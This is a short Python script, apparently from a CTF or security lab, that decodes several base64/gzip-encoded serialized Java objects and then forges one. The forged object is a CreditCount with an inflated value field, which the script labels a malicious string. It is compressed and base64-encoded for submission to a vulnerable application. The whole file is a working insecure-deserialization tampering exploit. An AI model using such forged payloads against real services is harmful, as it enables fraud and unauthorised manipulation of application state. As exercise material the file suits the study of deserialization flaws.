import gzip
import base64

base64_compressed_strings = [
"H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAIwCwY0JiUgAAAA==",
"H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAEwAKMkv7UgAAAA==",
"H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAKwCppy9lUgAAAA==",
"H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAGwAT9ib8UgAAAA==",
"H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAOwCFxiGLUgAAAA=="
]

for base64_compressed_string in base64_compressed_strings:
    print("[*] Base64 compressed string is: {}".format(base64_compressed_string))

    compressed_bytes = base64.b64decode(base64_compressed_string)
    print("[*] Compressed bytes are: {}".format(compressed_bytes))

    original_string = gzip.decompress(compressed_bytes)
    print("[*] Original bytes are: {}".format(original_string))
    
    print()

print("    -------\n")

malicious_string = b'\xac\xed\x00\x05sr\x00-com.credits.credits.credits.model.CreditCount2\t\xdb\x12\x14\t$G\x02\x00\x01J\x00\x05valuexp\x00\x00\x00\x00\xff\xff\xff\xff'
print("[*] Malicious string is: {}".format(malicious_string))

compressed_malicious_bytes = gzip.compress(malicious_string)
print("[*] Compressed malicious bytes are: {}".format(compressed_malicious_bytes))

base64_compressed_malicious_string = base64.b64encode(compressed_malicious_bytes).decode("ascii")

print("[*] Base64 compressed malicious string is: {}".format(base64_compressed_malicious_string))